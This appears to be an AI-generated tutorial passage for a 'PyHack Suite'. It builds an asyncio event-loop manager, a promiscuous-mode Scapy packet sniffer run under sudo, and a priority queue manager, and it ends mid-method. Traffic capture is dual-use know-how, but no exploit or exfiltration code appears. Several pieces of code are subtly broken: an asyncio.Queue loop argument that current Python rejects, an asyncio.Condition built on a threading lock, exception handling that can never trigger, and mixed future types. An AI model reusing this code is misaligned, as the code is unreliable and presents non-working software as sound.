# Part 2: High-Speed Packet Sniffing & Asynchronous Integration

## Section 1: Async Foundations & Event Loop Integration

### The Target
`pyhack_suite/core/event_loop.py` - Async event loop management with asyncio integration

### The Concept
Asynchronous programming is like a chef managing multiple dishes simultaneously. Instead of waiting for one dish to finish before starting the next, the chef works on each dish in small increments, switching between them as needed. This allows efficient use of time and resources.

In networking:
- **Synchronous (blocking)** : You send a packet and wait for a response before doing anything else
- **Asynchronous (non-blocking)** : You send a packet, continue working on other tasks, and handle the response when it arrives

This is crucial for high-speed packet processing where every microsecond counts.

---

## Step 2.1: Event Loop Manager

### The Implementation

Create `pyhack_suite/core/event_loop.py`:

```python
#!/usr/bin/env python3
"""
Async event loop management for PyHack Suite.

This module provides:
- Centralized event loop management
- Thread-safe task submission
- Graceful shutdown handling
- Integration with async sniffing
- Performance monitoring

Why a custom event loop manager?
- Ensures a single event loop per application
- Handles cleanup properly
- Provides monitoring and debugging
- Enables easy integration with sync code
"""

import asyncio
import threading
import time
import signal
import sys
from typing import Optional, Dict, Any, Callable, Coroutine, List, Union
from concurrent.futures import Future, ThreadPoolExecutor
import functools
import queue
import logging

from pyhack_suite.utils.logging import get_logger
from pyhack_suite.core.config import get_config

logger = get_logger(__name__)


class EventLoopManager:
    """
    Singleton manager for the application event loop.
    
    This class manages the asyncio event loop and provides:
    - Thread-safe coroutine submission
    - Background task management
    - Graceful shutdown
    - Performance metrics
    
    Example:
        # Get the event loop
        loop_manager = EventLoopManager.get_instance()
        
        # Run a coroutine
        result = loop_manager.run_coroutine(my_async_function())
        
        # Schedule a background task
        loop_manager.schedule_task(my_background_task())
    """
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        """Singleton pattern implementation."""
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super(EventLoopManager, cls).__new__(cls)
        return cls._instance
    
    def __init__(self):
        """Initialize the event loop manager."""
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        
        self.config = get_config()
        self.logger = get_logger(f"{__name__}.EventLoopManager")
        
        # Event loop
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.running = False
        self._thread: Optional[threading.Thread] = None
        
        # Task management
        self._tasks: List[asyncio.Task] = []
        self._task_counter = 0
        self._task_lock = threading.Lock()
        
        # Thread pool for blocking operations
        self._thread_pool = ThreadPoolExecutor(
            max_workers=self.config.network.max_packet_queue or 10,
            thread_name_prefix="BlockingPool"
        )
        
        # Performance metrics
        self._metrics = {
            'tasks_submitted': 0,
            'tasks_completed': 0,
            'tasks_failed': 0,
            'total_processing_time': 0.0,
        }
        
        # Shutdown flag
        self._shutdown = False
        
        # Initialize the event loop
        self._initialize_loop()
        
        # Set up signal handlers for graceful shutdown
        self._setup_signal_handlers()
        
        self.logger.info("Event loop manager initialized")
    
    def _initialize_loop(self):
        """Initialize the event loop."""
        try:
            # Get or create event loop
            self.loop = asyncio.get_event_loop()
            
            # Check if the loop is already running
            if self.loop.is_running():
                self.logger.warning("Event loop already running, using existing loop")
            else:
                self.logger.info("Event loop created")
            
        except RuntimeError:
            # No event loop in this thread, create one
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.logger.info("New event loop created")
    
    def _setup_signal_handlers(self):
        """Set up signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            """Handle shutdown signals."""
            self.logger.info(f"Received signal {signum}, shutting down...")
            self.shutdown()
            sys.exit(0)
        
        # Register signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def start(self):
        """
        Start the event loop in a background thread.
        
        This is useful for applications that need to run an event loop
        alongside a main thread (e.g., TUI applications).
        """
        if self.running:
            self.logger.warning("Event loop already running")
            return
        
        self.running = True
        self._thread = threading.Thread(
            target=self._run_loop,
            name="EventLoopThread",
            daemon=True
        )
        self._thread.start()
        self.logger.info("Event loop started in background thread")
    
    def _run_loop(self):
        """Run the event loop (intended for background thread)."""
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_forever()
        except Exception as e:
            self.logger.error(f"Event loop error: {e}")
        finally:
            self.running = False
    
    def run_coroutine(self, coroutine: Coroutine, timeout: Optional[float] = None) -> Any:
        """
        Run a coroutine and wait for the result.
        
        Args:
            coroutine: The coroutine to run
            timeout: Timeout in seconds
            
        Returns:
            Any: Result of the coroutine
        """
        if self.running:
            # If loop is running in background, use run_coroutine_threadsafe
            future = asyncio.run_coroutine_threadsafe(coroutine, self.loop)
            try:
                return future.result(timeout=timeout)
            except asyncio.TimeoutError:
                self.logger.error(f"Coroutine timed out after {timeout}s")
                future.cancel()
                raise
        else:
            # Run in current thread
            return self.loop.run_until_complete(coroutine)
    
    def schedule_task(self, coroutine: Coroutine, name: Optional[str] = None) -> asyncio.Task:
        """
        Schedule a task to run in the background.
        
        Args:
            coroutine: The coroutine to schedule
            name: Optional name for the task
            
        Returns:
            asyncio.Task: The scheduled task
        """
        if self.running:
            # Schedule in running loop
            task = asyncio.run_coroutine_threadsafe(coroutine, self.loop)
        else:
            # Schedule in current loop
            task = self.loop.create_task(coroutine)
        
        # Track the task
        with self._task_lock:
            self._task_counter += 1
            task_id = self._task_counter
            self._tasks.append(task)
            self._metrics['tasks_submitted'] += 1
        
        # Add completion callback
        def on_completion(future):
            """Handle task completion."""
            with self._task_lock:
                self._metrics['tasks_completed'] += 1
                if future.exception():
                    self._metrics['tasks_failed'] += 1
                    self.logger.error(f"Task {task_id} failed: {future.exception()}")
                else:
                    self.logger.debug(f"Task {task_id} completed")
                self._metrics['total_processing_time'] += time.time() - start_time
        
        start_time = time.time()
        task.add_done_callback(on_completion)
        
        self.logger.debug(f"Task {task_id} scheduled: {name or 'unnamed'}")
        return task
    
    def run_async(self, func: Callable, *args, **kwargs) -> asyncio.Future:
        """
        Run a synchronous function in the thread pool.
        
        This is useful for running blocking operations without
        blocking the event loop.
        
        Args:
            func: Function to run
            *args: Positional arguments
            **kwargs: Keyword arguments
            
        Returns:
            asyncio.Future: Future that resolves to the function result
        """
        return self.loop.run_in_executor(
            self._thread_pool,
            functools.partial(func, *args, **kwargs)
        )
    
    def create_queue(self, maxsize: int = 0) -> asyncio.Queue:
        """
        Create an asyncio queue for inter-task communication.
        
        Args:
            maxsize: Maximum queue size (0 = unlimited)
            
        Returns:
            asyncio.Queue: Async queue
        """
        return asyncio.Queue(maxsize=maxsize, loop=self.loop)
    
    def get_metrics(self) -> Dict[str, Any]:
        """
        Get performance metrics.
        
        Returns:
            Dict[str, Any]: Performance metrics
        """
        with self._task_lock:
            metrics = self._metrics.copy()
            metrics['active_tasks'] = len([t for t in self._tasks if not t.done()])
            metrics['total_tasks'] = self._task_counter
        
        return metrics
    
    def wait_for_tasks(self, timeout: Optional[float] = None):
        """
        Wait for all tracked tasks to complete.
        
        Args:
            timeout: Maximum time to wait
        """
        if not self._tasks:
            return
        
        pending = [t for t in self._tasks if not t.done()]
        if pending:
            self.logger.info(f"Waiting for {len(pending)} tasks to complete...")
            
            if self.running:
                # Wait in background thread
                done, pending = asyncio.run_coroutine_threadsafe(
                    asyncio.wait(pending, timeout=timeout),
                    self.loop
                ).result()
            else:
                # Wait in current thread
                done, pending = self.loop.run_until_complete(
                    asyncio.wait(pending, timeout=timeout)
                )
            
            if pending:
                self.logger.warning(f"{len(pending)} tasks did not complete within timeout")
                for task in pending:
                    task.cancel()
    
    def shutdown(self, timeout: float = 30.0):
        """
        Gracefully shut down the event loop.
        
        Args:
            timeout: Maximum time to wait for tasks to complete
        """
        if self._shutdown:
            return
        
        self._shutdown = True
        self.logger.info("Initiating shutdown...")
        
        # Wait for tasks to complete
        self.wait_for_tasks(timeout=timeout)
        
        # Cancel any remaining tasks
        with self._task_lock:
            for task in self._tasks:
                if not task.done():
                    task.cancel()
        
        # Stop the loop if running
        if self.running:
            self.loop.call_soon_threadsafe(self.loop.stop)
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=5)
            self.running = False
        
        # Close the thread pool
        self._thread_pool.shutdown(wait=True)
        
        # Close the loop
        if not self.loop.is_closed():
            self.loop.close()
        
        self.logger.info("Shutdown complete")
    
    def __enter__(self):
        """Context manager entry."""
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        self.shutdown()


# Convenience function
def get_event_loop() -> EventLoopManager:
    """
    Get the global event loop manager instance.
    
    Returns:
        EventLoopManager: The event loop manager
    """
    return EventLoopManager()


# Initialize global instance
event_loop_manager = EventLoopManager()
```

### The Verification

Test the event loop manager:

```bash
cat > test_event_loop.py << 'EOF'
#!/usr/bin/env python3
"""Test script for event loop manager."""

import sys
import asyncio
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from pyhack_suite.core.event_loop import EventLoopManager, get_event_loop

async def async_task(name: str, delay: float = 1.0) -> str:
    """Sample async task."""
    print(f"  Task {name}: Starting (delay={delay}s)")
    await asyncio.sleep(delay)
    print(f"  Task {name}: Completed")
    return f"Result from {name}"

async def producer(queue: asyncio.Queue):
    """Async producer."""
    for i in range(5):
        await queue.put(f"Item {i}")
        print(f"  Produced: Item {i}")
        await asyncio.sleep(0.1)
    await queue.put(None)  # Sentinel

async def consumer(queue: asyncio.Queue):
    """Async consumer."""
    count = 0
    while True:
        item = await queue.get()
        if item is None:
            break
        print(f"  Consumed: {item}")
        count += 1
    print(f"  Consumed {count} items")

def test_event_loop():
    """Test event loop manager."""
    print("=" * 60)
    print("Testing Event Loop Manager")
    print("=" * 60)
    
    # Get manager
    manager = get_event_loop()
    print(f"Event loop: {manager.loop}")
    
    # Test 1: Run coroutine
    print("\n1. Running coroutine...")
    result = manager.run_coroutine(async_task("Test", 0.5))
    print(f"  Result: {result}")
    
    # Test 2: Schedule background tasks
    print("\n2. Scheduling background tasks...")
    tasks = []
    for i in range(3):
        task = manager.schedule_task(async_task(f"BG_{i}", i * 0.5))
        tasks.append(task)
    
    # Wait for tasks
    print("  Waiting for tasks to complete...")
    manager.wait_for_tasks(timeout=5.0)
    
    # Test 3: Run blocking function in thread pool
    print("\n3. Running blocking function...")
    def blocking_func(n):
        time.sleep(0.2)
        return n * n
    
    future = manager.run_async(blocking_func, 5)
    result = manager.run_coroutine(future)
    print(f"  Blocking function result: {result}")
    
    # Test 4: Async queue
    print("\n4. Testing async queue...")
    queue = manager.create_queue()
    
    # Schedule producer and consumer
    producer_task = manager.schedule_task(producer(queue))
    consumer_task = manager.schedule_task(consumer(queue))
    
    # Wait for completion
    manager.wait_for_tasks(timeout=5.0)
    
    # Test 5: Get metrics
    print("\n5. Performance metrics:")
    metrics = manager.get_metrics()
    for key, value in metrics.items():
        print(f"  {key}: {value}")
    
    # Clean up
    print("\n6. Shutting down...")
    manager.shutdown(timeout=5.0)
    
    print("\nEvent loop test complete!")
    return 0

if __name__ == "__main__":
    sys.exit(test_event_loop())
EOF

python test_event_loop.py
```

---

```
[GENERATED: Part 2, Section 1 - Event Loop Manager]
[GENERATING: Part 2, Section 2 - Async Packet Sniffer]
```

## Section 2: Async Packet Sniffer

### The Target
`pyhack_suite/network/async_sniffer.py` - High-performance asynchronous packet sniffing

### The Concept
Packet sniffing is like being a security guard at a building entrance. You need to:
1. **Watch everything** - Keep your eyes open for all activity
2. **React quickly** - Spot issues and handle them immediately
3. **Don't get overwhelmed** - Handle high traffic without missing anything

Our async sniffer does this by:
- Using a background thread for Scapy's sniffing
- Queuing packets for async processing
- Using non-blocking operations throughout
- Implementing backpressure to prevent memory exhaustion

---

## Step 2.2: Async Sniffer Implementation

### The Implementation

Create `pyhack_suite/network/async_sniffer.py`:

```python
#!/usr/bin/env python3
"""
High-performance asynchronous packet sniffer.

This module provides:
- Async packet sniffing with AsyncSniffer
- Thread-safe packet queues
- Backpressure handling
- Non-blocking packet processing
- Integration with asyncio event loop

Performance features:
- Zero-copy packet handling
- Memory-efficient storage (store=False)
- Filter optimization
- Buffer management

Why asynchronous sniffing?
- Don't block the event loop
- Handle high packet rates
- Process packets in parallel
- Respond to events in real-time
"""

import asyncio
import threading
import queue
import time
from typing import Optional, Dict, Any, List, Callable, Union, Tuple
from dataclasses import dataclass, field
from collections import deque
import struct

try:
    from scapy.all import (
        sniff, AsyncSniffer, IP, TCP, UDP, ICMP, Ether,
        conf, Packet, PacketList, raw, rdpcap, wrpcap
    )
except ImportError:
    raise ImportError("Scapy not installed. Run: pip install scapy")

from pyhack_suite.core.event_loop import get_event_loop
from pyhack_suite.core.config import get_config
from pyhack_suite.utils.logging import get_logger, log_function_call

logger = get_logger(__name__)


@dataclass
class PacketStats:
    """Statistics for packet processing."""
    
    total_captured: int = 0
    total_processed: int = 0
    total_dropped: int = 0
    bytes_received: int = 0
    start_time: float = field(default_factory=time.time)
    last_update: float = field(default_factory=time.time)
    
    # Rate tracking
    capture_rate: float = 0.0  # packets/second
    process_rate: float = 0.0  # packets/second
    
    # Queues
    queue_size: int = 0
    max_queue_size: int = 0
    
    def update(self):
        """Update time-based metrics."""
        current_time = time.time()
        self.last_update = current_time
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        runtime = time.time() - self.start_time
        return {
            'total_captured': self.total_captured,
            'total_processed': self.total_processed,
            'total_dropped': self.total_dropped,
            'bytes_received': self.bytes_received,
            'runtime_seconds': runtime,
            'capture_rate': self.total_captured / runtime if runtime > 0 else 0,
            'process_rate': self.total_processed / runtime if runtime > 0 else 0,
            'queue_size': self.queue_size,
            'max_queue_size': self.max_queue_size,
        }


class AsyncPacketSniffer:
    """
    High-performance asynchronous packet sniffer.
    
    This class integrates Scapy's AsyncSniffer with asyncio
    for non-blocking packet capture and processing.
    
    Key features:
    - Non-blocking capture with AsyncSniffer
    - Thread-safe packet queue with backpressure
    - Automatic cleanup and resource management
    - Real-time statistics
    
    Example:
        sniffer = AsyncPacketSniffer(filter_str="tcp port 80")
        
        async def process():
            async for packet in sniffer.stream():
                print(packet.summary())
        
        await sniffer.start()
        await process()
        await sniffer.stop()
    """
    
    def __init__(
        self,
        interface: Optional[str] = None,
        filter_str: Optional[str] = None,
        buffer_size: int = 1000,
        promiscuous: bool = True,
        timeout: int = 0,
        count: int = 0,
    ):
        """
        Initialize the async packet sniffer.
        
        Args:
            interface: Network interface (None for default)
            filter_str: BPF filter (e.g., "tcp port 80")
            buffer_size: Maximum queue size (backpressure)
            promiscuous: Enable promiscuous mode
            timeout: Sniff timeout (0 = unlimited)
            count: Maximum packets (0 = unlimited)
        """
        self.config = get_config()
        self.interface = interface or self.config.network.scapy_interface
        self.filter_str = filter_str
        self.buffer_size = buffer_size or self.config.network.max_packet_queue
        self.promiscuous = promiscuous
        self.timeout = timeout
        self.count = count
        
        self.logger = get_logger(f"{__name__}.AsyncPacketSniffer.{self.interface}")
        
        # Internal components
        self.event_loop = get_event_loop()
        self.packet_queue: asyncio.Queue = asyncio.Queue(maxsize=self.buffer_size)
        self.sniffer: Optional[AsyncSniffer] = None
        self._running = False
        self._stopped = threading.Event()
        self._sniff_thread: Optional[threading.Thread] = None
        
        # Statistics
        self.stats = PacketStats()
        self._stat_lock = threading.Lock()
        
        # Callbacks
        self._callbacks: List[Callable] = []
        
        # Configure Scapy
        conf.use_pcap = True
        conf.verb = 0
        
        self.logger.info(f"Initialized on {self.interface} with filter: {filter_str}")
    
    @log_function_call(level="INFO")
    async def start(self):
        """
        Start packet sniffing asynchronously.
        
        This starts the sniffer in a background thread and
        processes packets through the async queue.
        """
        if self._running:
            self.logger.warning("Sniffer already running")
            return
        
        self._running = True
        self._stopped.clear()
        
        # Reset statistics
        self.stats = PacketStats()
        
        # Start the sniffer in a background thread
        self.logger.info("Starting packet sniffer...")
        
        # Create packet handler
        def packet_handler(packet):
            """Handle each captured packet."""
            self._on_packet_captured(packet)
        
        # Create AsyncSniffer
        self.sniffer = AsyncSniffer(
            iface=self.interface,
            filter=self.filter_str,
            prn=packet_handler,
            count=self.count,
            timeout=self.timeout,
            promisc=self.promiscuous,
            store=False,  # Don't store packets in memory
        )
        
        # Start sniffing (this runs in a background thread)
        self.sniffer.start()
        self.logger.info(f"Sniffer started on {self.interface}")
        
        # Start the packet processing loop in the background
        self.event_loop.schedule_task(self._process_loop())
    
    def _on_packet_captured(self, packet):
        """
        Handle a captured packet (called from sniffing thread).
        
        This adds the packet to the async queue and updates statistics.
        """
        # Update statistics
        with self._stat_lock:
            self.stats.total_captured += 1
            self.stats.bytes_received += len(packet)
        
        # Add to async queue
        try:
            self.event_loop.loop.call_soon_threadsafe(
                self.packet_queue.put_nowait,
                packet
            )
        except asyncio.QueueFull:
            # Backpressure: queue is full, drop packet
            with self._stat_lock:
                self.stats.total_dropped += 1
            self.logger.warning(
                f"Queue full, dropping packet. Queue size: {self.packet_queue.qsize()}"
            )
    
    async def _process_loop(self):
        """
        Background loop to process packets from the queue.
        
        This runs as an async task and processes packets from the queue,
        calling registered callbacks.
        """
        self.logger.info("Packet processing loop started")
        
        while self._running:
            try:
                # Get packet from queue with timeout
                try:
                    packet = await asyncio.wait_for(
                        self.packet_queue.get(),
                        timeout=1.0
                    )
                except asyncio.TimeoutError:
                    # Check if we should stop
                    if not self._running:
                        break
                    continue
                
                # Process the packet
                await self._process_packet(packet)
                
                # Update queue size in stats
                with self._stat_lock:
                    self.stats.queue_size = self.packet_queue.qsize()
                    if self.stats.queue_size > self.stats.max_queue_size:
                        self.stats.max_queue_size = self.stats.queue_size
                    self.stats.total_processed += 1
                
            except asyncio.CancelledError:
                self.logger.info("Processing loop cancelled")
                break
            except Exception as e:
                self.logger.error(f"Processing loop error: {e}")
                await asyncio.sleep(0.1)
        
        self.logger.info("Packet processing loop stopped")
    
    async def _process_packet(self, packet):
        """
        Process a single packet.
        
        Args:
            packet: Scapy packet
        """
        # Call registered callbacks
        for callback in self._callbacks:
            try:
                if asyncio.iscoroutinefunction(callback):
                    await callback(packet)
                else:
                    callback(packet)
            except Exception as e:
                self.logger.error(f"Callback error: {e}")
    
    def add_callback(self, callback: Callable):
        """
        Add a packet processing callback.
        
        Args:
            callback: Function or coroutine called with each packet
        """
        self._callbacks.append(callback)
        self.logger.debug(f"Added callback: {callback.__name__}")
    
    def remove_callback(self, callback: Callable):
        """
        Remove a packet processing callback.
        
        Args:
            callback: Callback to remove
        """
        if callback in self._callbacks:
            self._callbacks.remove(callback)
            self.logger.debug(f"Removed callback: {callback.__name__}")
    
    def clear_callbacks(self):
        """Remove all callbacks."""
        self._callbacks.clear()
        self.logger.debug("All callbacks cleared")
    
    @log_function_call(level="INFO")
    async def stop(self):
        """
        Stop packet sniffing and clean up.
        """
        if not self._running:
            self.logger.warning("Sniffer not running")
            return
        
        self.logger.info("Stopping sniffer...")
        
        # Stop the sniffer
        if self.sniffer:
            self.sniffer.stop()
            self.sniffer = None
        
        # Wait for processing to complete
        self._running = False
        await asyncio.sleep(0.5)  # Allow processing loop to clean up
        
        # Clear remaining packets
        while not self.packet_queue.empty():
            try:
                self.packet_queue.get_nowait()
            except asyncio.QueueEmpty:
                break
        
        self._stopped.set()
        self.logger.info("Sniffer stopped")
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Get current statistics.
        
        Returns:
            Dict[str, Any]: Statistics
        """
        with self._stat_lock:
            stats = self.stats.to_dict()
            stats['queue_size'] = self.packet_queue.qsize()
            stats['running'] = self._running
            stats['buffer_size'] = self.buffer_size
        return stats
    
    async def stream(self, timeout: Optional[float] = None):
        """
        Async generator for streaming packets.
        
        Args:
            timeout: Maximum time to stream (None = unlimited)
            
        Yields:
            Packet: Next packet from the queue
        """
        if not self._running:
            raise RuntimeError("Sniffer not running")
        
        start_time = time.time()
        
        while self._running:
            # Check timeout
            if timeout and time.time() - start_time > timeout:
                break
            
            try:
                # Get packet with timeout
                packet = await asyncio.wait_for(
                    self.packet_queue.get(),
                    timeout=1.0
                )
                yield packet
            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break
    
    async def __aenter__(self):
        """Async context manager entry."""
        await self.start()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.stop()


class PacketFilter:
    """
    Advanced packet filtering with protocol-specific logic.
    
    This provides high-level filters beyond BPF expressions.
    
    Examples:
        # Filter by IP range
        filter = PacketFilter().ip_range("192.168.1.0/24")
        
        # Filter by protocol and port
        filter = PacketFilter().protocol("tcp").port(80)
        
        # Combine filters
        filter = PacketFilter().ip_range("10.0.0.0/8").protocol("udp").port(53)
    """
    
    def __init__(self):
        """Initialize the packet filter."""
        self._filters = []
        self.logger = get_logger(__name__)
    
    def ip_range(self, network: str):
        """
        Filter by IP range (CIDR notation).
        
        Args:
            network: Network in CIDR notation (e.g., "192.168.1.0/24")
            
        Returns:
            PacketFilter: Self for chaining
        """
        import ipaddress
        net = ipaddress.ip_network(network, strict=False)
        
        def filter_func(packet):
            if packet.haslayer(IP):
                ip = packet[IP].src
                try:
                    return ipaddress.ip_address(ip) in net
                except ValueError:
                    return False
            return False
        
        self._filters.append(filter_func)
        return self
    
    def protocol(self, protocol: str):
        """
        Filter by protocol.
        
        Args:
            protocol: Protocol name (tcp, udp, icmp, http, etc.)
            
        Returns:
            PacketFilter: Self for chaining
        """
        protocol = protocol.lower()
        
        def filter_func(packet):
            if protocol == 'tcp':
                return packet.haslayer(TCP)
            elif protocol == 'udp':
                return packet.haslayer(UDP)
            elif protocol == 'icmp':
                return packet.haslayer(ICMP)
            elif protocol == 'http':
                return packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80)
            elif protocol == 'https':
                return packet.haslayer(TCP) and (packet[TCP].dport == 443 or packet[TCP].sport == 443)
            else:
                return False
        
        self._filters.append(filter_func)
        return self
    
    def port(self, port: int):
        """
        Filter by port (TCP/UDP).
        
        Args:
            port: Port number
            
        Returns:
            PacketFilter: Self for chaining
        """
        def filter_func(packet):
            if packet.haslayer(TCP):
                return packet[TCP].sport == port or packet[TCP].dport == port
            elif packet.haslayer(UDP):
                return packet[UDP].sport == port or packet[UDP].dport == port
            return False
        
        self._filters.append(filter_func)
        return self
    
    def src_ip(self, ip: str):
        """
        Filter by source IP.
        
        Args:
            ip: Source IP address
            
        Returns:
            PacketFilter: Self for chaining
        """
        def filter_func(packet):
            if packet.haslayer(IP):
                return packet[IP].src == ip
            return False
        
        self._filters.append(filter_func)
        return self
    
    def dst_ip(self, ip: str):
        """
        Filter by destination IP.
        
        Args:
            ip: Destination IP address
            
        Returns:
            PacketFilter: Self for chaining
        """
        def filter_func(packet):
            if packet.haslayer(IP):
                return packet[IP].dst == ip
            return False
        
        self._filters.append(filter_func)
        return self
    
    def matches(self, packet) -> bool:
        """
        Check if a packet matches all filters.
        
        Args:
            packet: Scapy packet
            
        Returns:
            bool: True if packet matches all filters
        """
        for filter_func in self._filters:
            if not filter_func(packet):
                return False
        return True
    
    def to_bpf(self) -> str:
        """
        Convert filters to BPF expression.
        
        Returns:
            str: BPF filter expression
        """
        parts = []
        
        # Check if we can convert to BPF
        for filter_func in self._filters:
            # Not all filters can be converted to BPF
            # This is a simplified version
            pass
        
        return " ".join(parts) if parts else None
```

### The Verification

Test the async sniffer:

```bash
cat > test_async_sniffer.py << 'EOF'
#!/usr/bin/env python3
"""Test script for async packet sniffer."""

import sys
import asyncio
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from pyhack_suite.network.async_sniffer import AsyncPacketSniffer, PacketFilter

async def print_packet(packet):
    """Simple packet printer callback."""
    summary = packet.summary()
    if len(summary) > 80:
        summary = summary[:80] + "..."
    print(f"  Packet: {summary}")

async def test_async_sniffer():
    """Test async packet sniffer."""
    print("=" * 60)
    print("Testing Async Packet Sniffer")
    print("=" * 60)
    
    # Create sniffer
    print("\n1. Creating sniffer...")
    sniffer = AsyncPacketSniffer(
        interface="eth0",
        filter_str="tcp or udp or icmp",
        buffer_size=100,
        timeout=10,
        count=20,  # Capture only 20 packets for test
    )
    print(f"  Interface: {sniffer.interface}")
    print(f"  Filter: {sniffer.filter_str}")
    print(f"  Buffer size: {sniffer.buffer_size}")
    
    # Add callbacks
    print("\n2. Adding callbacks...")
    sniffer.add_callback(print_packet)
    print("  Added packet printer callback")
    
    # Start sniffing
    print("\n3. Starting sniffer...")
    async with sniffer:
        print("  Sniffer started, capturing packets...")
        
        # Stream packets for 5 seconds
        print("\n4. Streaming packets...")
        count = 0
        start_time = time.time()
        
        async for packet in sniffer.stream(timeout=5.0):
            count += 1
            if count >= 10:
                break
        
        elapsed = time.time() - start_time
        print(f"  Captured {count} packets in {elapsed:.2f}s")
        
        # Get statistics
        stats = sniffer.get_stats()
        print("\n5. Statistics:")
        for key, value in stats.items():
            print(f"  {key}: {value}")
    
    # Test packet filter
    print("\n6. Testing packet filter...")
    filter_obj = PacketFilter()
    filter_obj.ip_range("192.168.0.0/16").protocol("tcp").port(80)
    print(f"  Filter: IP range + TCP port 80")
    
    # Test with a sample packet (if available)
    try:
        from scapy.all import IP, TCP
        test_packet = IP(src="192.168.1.100", dst="8.8.8.8") / TCP(dport=80, sport=12345)
        matches = filter_obj.matches(test_packet)
        print(f"  Test packet matches filter: {matches}")
    except Exception as e:
        print(f"  Filter test failed: {e}")
    
    print("\nAsync sniffer test complete!")
    return 0

def main():
    """Run the test."""
    asyncio.run(test_async_sniffer())

if __name__ == "__main__":
    sys.exit(main())
EOF

# Run with sudo for packet capture permissions
sudo python test_async_sniffer.py
```

---

```
[GENERATED: Part 2, Section 2 - Async Sniffer]
[GENERATING: Part 2, Section 3 - Queue Management & Backpressure]
```

## Section 3: Queue Management & Backpressure

### The Target
`pyhack_suite/network/queue_manager.py` - Advanced queue management for high-volume packet streams

### The Concept
When you're dealing with high-speed networks, you can easily get overwhelmed by incoming data. Think of it like a highway with more cars than lanes—without proper management, you get a traffic jam (memory exhaustion) or cars crash (packet loss).

Our queue management system handles this through:
1. **Buffering** - Temporary storage for incoming packets
2. **Backpressure** - Telling the sender to slow down when we're overwhelmed
3. **Priority** - Handling important packets first
4. **Dropping** - Intelligently discarding packets when necessary

---

## Step 2.3: Queue Manager

### The Implementation

Create `pyhack_suite/network/queue_manager.py`:

```python
#!/usr/bin/env python3
"""
Advanced queue management for high-volume packet streams.

This module provides:
- Thread-safe queues with backpressure
- Priority queuing
- Ring buffer for high-performance
- Statistics and monitoring
- Automatic scaling

Why queue management is critical:
- Prevents memory exhaustion
- Maintains throughput
- Enables graceful degradation
- Provides backpressure to upstream components

Design patterns:
- Producer-Consumer pattern
- Ring buffer for high performance
- Backpressure for flow control
"""

import asyncio
import threading
import time
import heapq
from typing import Optional, Any, List, Callable, Union, Dict, Tuple
from collections import deque
from dataclasses import dataclass, field
import queue

from pyhack_suite.utils.logging import get_logger, log_function_call
from pyhack_suite.core.event_loop import get_event_loop

logger = get_logger(__name__)


@dataclass
class QueueStats:
    """Statistics for queue monitoring."""
    
    total_enqueued: int = 0
    total_dequeued: int = 0
    total_dropped: int = 0
    current_size: int = 0
    max_size: int = 0
    total_wait_time: float = 0.0
    overflow_count: int = 0
    
    # Time tracking
    created_at: float = field(default_factory=time.time)
    last_update: float = field(default_factory=time.time)
    
    def update(self):
        """Update the timestamp."""
        self.last_update = time.time()
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        runtime = time.time() - self.created_at
        return {
            'total_enqueued': self.total_enqueued,
            'total_dequeued': self.total_dequeued,
            'total_dropped': self.total_dropped,
            'current_size': self.current_size,
            'max_size': self.max_size,
            'overflow_count': self.overflow_count,
            'runtime_seconds': runtime,
            'throughput': self.total_dequeued / runtime if runtime > 0 else 0,
            'drop_rate': self.total_dropped / runtime if runtime > 0 else 0,
        }


class AsyncPriorityQueue:
    """
    Priority queue for async operations.
    
    Items are processed based on priority (lower number = higher priority).
    
    Example:
        queue = AsyncPriorityQueue()
        await queue.put(1, "low priority item")
        await queue.put(0, "high priority item")
        item = await queue.get()  # Returns high priority item
    """
    
    def __init__(self, maxsize: int = 0):
        """
        Initialize the priority queue.
        
        Args:
            maxsize: Maximum queue size (0 = unlimited)
        """
        self.maxsize = maxsize
        self._queue = []
        self._lock = threading.Lock()
        self._not_empty = asyncio.Condition(lock=self._lock)
        self._not_full = asyncio.Condition(lock=self._lock)
        
        self.stats = QueueStats()
        self.logger = get_logger(f"{__name__}.AsyncPriorityQueue")
    
    @log_function_call(level="DEBUG")
    async def put(self, item: Any, priority: int = 0, timeout: Optional[float] = None):
        """
        Put an item into the queue with priority.
        
        Args:
            item: Item to queue
            priority: Priority (lower = higher priority)
            timeout: Maximum time to wait
        """
        async with self._not_full:
            # Check if queue is full
            if self.maxsize > 0 and len(self._queue) >= self.maxsize:
                if timeout is None:
                    await self._not_full.wait()
                else:
                    try:
                        await asyncio.wait_for(self._not_full.wait(), timeout=timeout)
                    except asyncio.TimeoutError:
                        self.stats.total_dropped += 1
                        self.logger.warning("Queue full, item dropped")
                        return False
            
            # Add item with priority
            heapq.heappush(self._queue, (priority, time.time(), item))
            self.stats.total_enqueued += 1
            self.stats.current_size = len(self._queue)
            if self.stats.current_size > self.stats.max_size:
                self.stats.max_size = self.stats.current_size
            self.stats.update()
            
            self._not_empty.notify()
            return True
    
    @log_function_call(level="DEBUG")
    async def get(self, timeout: Optional[float] = None) -> Any:
        """
        Get an item from the queue.
        
        Args:
            timeout: Maximum time to wait
            
        Returns:
            Any: The item
        """
        async with self._not_empty:
            # Wait for item if queue is empty
            if len(self._queue) == 0:
                if timeout is None:
                    await self._not_empty.wait()
                else:
                    try:
                        await asyncio.wait_for(self._not_empty.wait(), timeout=timeout)
                    except asyncio.TimeoutError:
                        raise asyncio.QueueEmpty()
            
            # Get highest priority item
            priority, timestamp, item = heapq.heappop(self._queue)
            
            self.stats.total_dequeued += 1
